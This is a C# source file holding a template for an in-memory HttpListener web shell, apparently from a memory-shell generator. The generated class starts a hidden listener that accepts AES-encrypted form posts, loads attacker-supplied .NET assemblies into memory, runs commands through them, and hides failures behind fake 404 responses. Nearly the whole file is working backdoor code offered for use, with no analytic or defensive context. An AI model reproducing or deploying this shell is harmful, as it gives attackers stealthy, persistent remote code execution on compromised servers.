namespace NMG.Templates;

/// <summary>
/// HttpListener memory shell template for SYSTEM-privileged targets.
/// Creates a standalone HTTP listener that operates independently of IIS.
/// Requires the process to have URL ACL registration permission (or run as SYSTEM/admin).
/// </summary>
public static class HttpListenerTemplate
{
    public const string Source = """
        using System;
        using System.Collections.Specialized;
        using System.IO;
        using System.Text;
        using System.Net;
        using System.Reflection;
        using System.Threading;
        using System.Web;

        namespace {{NAMESPACE}}
        {
            public class {{CLASSNAME}}
            {
        {{MEMBERS}}

                public static string httpListenerURL = "{{LISTENER_URL}}";

                static {{CLASSNAME}}()
                {
                    if (!load)
                    {
                        try
                        {
                            if (!HttpListener.IsSupported) return;
                            HttpListener listener = new HttpListener();
                            listener.Prefixes.Add(httpListenerURL);
                            listener.Start();
                            new Thread(new ParameterizedThreadStart(new {{CLASSNAME}}().Run)).Start(listener);
                            load = true;
                        }
                        catch (Exception)
                        {
                        }
                    }
                }

                public {{CLASSNAME}}()
                {
                }

                private void Run(object listenerobj)
                {
                    HttpListener listener = (HttpListener)listenerobj;
                    try
                    {
                        Assembly asmPayload = null;
                        while (true)
                        {
                            HttpListenerContext context = listener.GetContext();
                            HttpListenerRequest Request = context.Request;
                            HttpListenerResponse Response = context.Response;
                            StreamWriter ResponseStream = new StreamWriter(Response.OutputStream);
                            try
                            {
                                try
                                {
                                    NameValueCollection RequestFrom = null;
                                    if (Request.InputStream != null && Request.HttpMethod != "GET" && Request.ContentType.StartsWith("application/x-www-form-urlencoded"))
                                    {
                                        RequestFrom = HttpUtility.ParseQueryString(new StreamReader(Request.InputStream).ReadToEnd());
                                    }
                                    else
                                    {
                                        RequestFrom = new NameValueCollection();
                                    }

                                    string md5 = System.BitConverter.ToString(
                                        new System.Security.Cryptography.MD5CryptoServiceProvider().ComputeHash(
                                            System.Text.Encoding.Default.GetBytes(password + key))).Replace("-", "");
                                    byte[] data = System.Convert.FromBase64String(RequestFrom[password]);
                                    data = new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(
                                        System.Text.Encoding.Default.GetBytes(key),
                                        System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(data, 0, data.Length);
                                    if (asmPayload == null)
                                    {
                                        asmPayload = (Assembly)typeof(Assembly).GetMethod("Load",
                                            new Type[] { typeof(byte[]) }).Invoke(null, new object[] { data });
                                    }
                                    else
                                    {
                                        object o = asmPayload.CreateInstance("LY");
                                        MemoryStream outStream = new MemoryStream();
                                        o.Equals(outStream);
                                        o.Equals(data);
                                        o.ToString();
                                        byte[] r = outStream.ToArray();
                                        if (r.Length > 0)
                                        {
                                            outStream.Dispose();
                                            ResponseStream.Write(GenerateRandomString(rd.Next(5, 50)));
                                            ResponseStream.Write(md5.Substring(0, 16));
                                            ResponseStream.Write(Convert.ToBase64String(
                                                new System.Security.Cryptography.RijndaelManaged().CreateEncryptor(
                                                    System.Text.Encoding.Default.GetBytes(key),
                                                    System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(r, 0, r.Length)));
                                            ResponseStream.Write(md5.Substring(16));
                                            ResponseStream.Write(GenerateRandomString(rd.Next(10, 60)));
                                            Response.StatusCode = 200;
                                        }
                                        else
                                        {
                                            throw new Exception();
                                        }
                                    }
                                }
                                catch (Exception)
                                {
                                    Response.StatusCode = 404;
                                }
                            }
                            catch (Exception)
                            {
                                Response.StatusCode = 404;
                            }
                            finally
                            {
                                ResponseStream.Flush();
                                ResponseStream.Close();
                                Response.Close();
                            }
                        }
                    }
                    catch (Exception)
                    {
                        listener.Abort();
                        listener.Close();
                    }
                    load = false;
                }

        {{RANDOM_STRING}}
            }
        }
        """;
}
